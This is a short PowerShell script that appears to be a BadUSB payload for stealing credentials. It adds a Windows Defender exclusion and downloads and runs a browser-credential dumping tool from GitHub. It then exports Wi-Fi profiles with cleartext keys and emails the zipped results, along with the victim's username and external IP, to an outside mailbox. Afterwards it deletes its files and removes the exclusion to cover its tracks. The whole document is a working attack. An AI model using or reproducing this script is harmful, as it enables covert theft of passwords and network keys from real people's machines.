#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
$pass1 = Get-Content $env:localappdata\Temp\pass1.txt
mkdir "$env:appdata\Microsoft\dump"
mkdir "$env:appdata\Microsoft\wifi"
Set-Location "$env:appdata\Microsoft\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
#$Random = Get-Random
#Wifi Grabber
Set-Location "$env:appdata\Microsoft\wifi"
netsh wlan export profile key=clear
Compress-Archive -Path * -DestinationPath wifi.zip
#Mailing the output you will need to enable less secure app access on your google account for this to work
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("ssl0.ovh.net")
$smtp.Credentials = New-Object System.Net.NetworkCredential("georges.lariviere@setln.fr", $pass1);
$smtp.EnableSsl = $true
$Message.From = "georges.lariviere@setln.fr"
$Message.To.Add("benjamin.lemangnen@setin.fr")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
#$files=Get-ChildItem 
$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
$Message.Attachments.Add("$env:appdata\Microsoft\wifi\wifi.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-Item -Path "$env:appdata\Microsoft\wifi" -Force -Recurse
Remove-Item -Path "$env:localappdata\Temp\pass1.txt" -Force
Remove-MpPreference -ExclusionPath "$env:appdata"
